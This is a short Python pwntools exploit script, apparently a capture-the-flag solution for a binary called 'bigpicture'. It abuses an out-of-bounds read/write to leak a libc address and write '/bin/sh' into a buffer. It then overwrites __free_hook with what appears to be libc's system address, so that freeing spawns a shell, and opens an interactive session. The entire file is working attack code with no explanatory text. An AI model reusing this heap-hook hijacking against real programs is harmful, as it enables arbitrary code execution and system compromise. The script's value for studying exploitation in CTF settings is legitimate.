from pwn import *

p = process('./bigpicture')

p.sendlineafter('How big? ', '100 x 10000')

binsh = '/bin/sh'

for i in range(len(binsh)):
    p.sendlineafter('> ', '{}, {}, {}'.format(0, i, binsh[i]))


'''
libc is at 0x00007f96e35e1000

free_hook : 0x7f96e39a67a8
buffer : 0x00007f96e3aa5010

offset is static

0x7f96e39a4030: 0x00007f96e3600806
'''


def read_result(offset):
    p.sendlineafter('> ', '{}, {}, {}'.format(0, offset, '_'))
    p.recvuntil('overwriting ')
    readed = p.recvn(1)
    return ord(readed)


def leak(offset, byte):
    ret = 0
    t = 1
    for i in range(byte):
        ret += t * read_result(offset+i)
        t *= 256
    return ret


def overwrite(offset, value):
    s = p64(value)
    for i in range(len(s)):
        if s[i]:
            p.sendlineafter('> ', '{}, {}, {}'.format(0, offset+i, s[i]))

leaked = leak(-1052640, 6)
libc = leaked - 129030
log.success('libc: {:#x}'.format(libc))
buf = libc + 4997136
log.success('buf: {:#x}'.format(buf))

log.info('Overwriting free hook')
overwrite((libc + 3954600) - buf, libc + 0x45390)

p.sendlineafter('> ', 'quit')
p.interactive()
